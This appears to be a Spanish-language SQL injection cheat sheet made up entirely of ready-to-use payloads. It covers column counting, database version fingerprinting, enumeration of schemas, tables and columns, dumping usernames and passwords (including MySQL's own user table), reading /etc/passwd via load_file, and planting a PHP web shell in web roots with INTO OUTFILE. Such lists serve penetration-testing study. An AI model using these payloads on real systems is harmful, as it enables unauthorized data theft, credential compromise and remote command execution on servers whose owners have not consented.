## Número Columnas
```sql
' ORDER BY 1-- -
' ORDER BY 100-- -
' ORDER BY 1,2,3,4,5-- -
' ORDER BY 1,2,3,4,5#

' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT "Test",2,NULL#
' UNION SELECT @@version,NULL,NULL#
```
### ORACLE
```sql
' UNION SELECT 'NULL','NULL' FROM+dual-- -
```
## Versiones
### ORACLE
```sql
' UNION SELECT BANNER, NULL FROM v$version--
' SELECT version FROM v$instance--
```
### MySQL and Microsoft
```sql
' UNION SELECT @@version, NULL-- -
```
### PostgreSQL
```sql
' UNION SELECT version(), NULL-- -
```
## Nombre de la BD actual
```sql
' UNION SELECT NULL,database(),NULL-- -
' UNION SELECT NULL,database(),NULL#
```
## Usuario
```sql
' UNION SELECT NULL,user(),NULL-- -
' UNION SELECT NULL,user(),NULL#
```
## Enumerar las DB
```sql
UNION SELECT NULL,schema_name,NULL from information_schema.schemata-- -
UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 1,1-- -
UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 2,1-- -
UNION SELECT NULL,schema_name,NULL from information_schema.schemata#
UNION SELECT NULL,schema_name,NULL from information_schema.schemata limit 1,1#
```
## Enumerar las Tablas
```sql
UNION SELECT NULL,table_name,NULL from information_schema.tables where table_schema="Colegio"-- -
UNION SELECT NULL,table_name,NULL from information_schema.tables where table_schema="Colegio"#
```
## Enumerar las Columnas
```sql
UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users"-- -
UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users" limit 1,1-- -
UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users"#
UNION SELECT NULL,column_name,NULL from information_schema.columns where table_schema="Colegio" and table_name="Users" limit 2,1#
```
## Data
```sql
UNION SELECT NULL,username,NULL from users-- -
UNION SELECT NULL,password,NULL from users#
UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users-- -
UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users#
UNION SELECT 1,concat(User,0x3a,Password),3,4 from mysql.user-- -
```
## Leyendo Archivos
```sql
UNION SELECT NULL,load_file('/etc/passwd'),NULL-- -
UNION SELECT NULL,load_file('/etc/passwd'),NULL#
```
## Escribiendo Archivos
```sql
' union select ("<?php system($_GET['cmd']) ?>") into outfile "C:/xampp/htdocs/shell.php"-- -
' union select 1,("<?php system($_GET['cmd']) ?>"),3,4 into outfile "/var/www/html/SQL/shell.php"-- -
```
